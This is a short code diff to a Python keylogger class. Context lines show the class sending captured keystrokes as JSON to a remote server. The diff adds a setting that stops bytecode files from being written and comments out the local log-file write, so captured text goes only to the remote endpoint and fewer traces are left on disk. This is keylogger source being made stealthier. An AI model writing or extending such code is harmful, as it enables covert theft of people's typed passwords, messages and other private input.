@@ -5,6 +5,9 @@ import requests
 import json
 from datetime import datetime
 import os
+import sys
+
+sys.dont_write_bytecode = True
 
 class KeyLogger:
 
@@ -46,8 +49,8 @@ class KeyLogger:
                           data=payload, 
                           headers={"Content-Type" : "application/json"}
                           )
-            with open(self.log_filename, "a") as f:
-                f.write(f"{timestamp} - {self.text}\n")
+            # with open(self.log_filename, "a") as f:
+                #f.write(f"{timestamp} - {self.text}\n")
         except:
             print("Failed to send log!")
 
